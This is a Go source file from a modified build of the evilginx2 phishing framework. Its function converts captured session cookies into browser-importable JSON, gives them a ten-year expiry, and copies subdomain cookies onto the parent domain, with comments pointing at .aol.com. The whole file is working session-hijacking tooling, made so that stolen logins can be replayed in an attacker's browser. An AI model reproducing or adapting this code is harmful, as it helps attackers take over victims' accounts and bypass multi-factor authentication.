package core

import (
	"encoding/json"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/database"
)

type exportCookie struct {
	Path           string `json:"path"`
	Domain         string `json:"domain"`
	ExpirationDate int64  `json:"expirationDate"`
	Value          string `json:"value"`
	Name           string `json:"name"`
	HttpOnly       bool   `json:"httpOnly"`
	HostOnly       bool   `json:"hostOnly"`
	Secure         bool   `json:"secure"`
	Session        bool   `json:"session"`
}

func FormatCookieTokens(tokens map[string]map[string]*database.CookieToken) string {
	var cookies []*exportCookie
	expTime := time.Now().Add(10 * 365 * 24 * time.Hour).Unix()

	// Track which cookie names are already on the parent domain (.aol.com)
	parentCookies := make(map[string]bool)

	// First pass: identify parent-domain cookies
	for domain, tmap := range tokens {
		if !strings.HasPrefix(domain, ".") {
			continue
		}
		d := strings.TrimPrefix(domain, ".")
		parts := strings.Split(d, ".")
		if len(parts) <= 2 {
			// already root domain (e.g. .aol.com)
			for k := range tmap {
				parentCookies[k] = true
			}
		}
	}

	// Second pass: export all cookies on original domains, AND duplicate subdomain cookies onto parent domain
	for domain, tmap := range tokens {
		for k, v := range tmap {
			if strings.EqualFold(v.Value, "DELETE") || strings.EqualFold(v.Value, "deleted") || v.Value == "" {
				continue
			}

			// Export on original domain
			c := &exportCookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: expTime,
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
				Secure:         v.Secure,
				Session:        false,
			}
			if strings.HasPrefix(domain, ".") {
				c.HostOnly = false
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)

			// Also duplicate on parent domain if this is a subdomain cookie not already on parent
			if strings.HasPrefix(domain, ".") {
				d := strings.TrimPrefix(domain, ".")
				parts := strings.Split(d, ".")
				if len(parts) > 2 && !parentCookies[k] {
					parentDomain := "." + strings.Join(parts[len(parts)-2:], ".")
					dup := &exportCookie{
						Path:           v.Path,
						Domain:         parentDomain,
						ExpirationDate: expTime,
						Value:          v.Value,
						Name:           k,
						HttpOnly:       v.HttpOnly,
						Secure:         v.Secure,
						Session:        false,
					}
					if dup.Path == "" {
						dup.Path = "/"
					}
					dup.HostOnly = false
					cookies = append(cookies, dup)
				}
			}
		}
	}
	if len(cookies) == 0 {
		return "[]"
	}
	b, _ := json.Marshal(cookies)
	return string(b)
}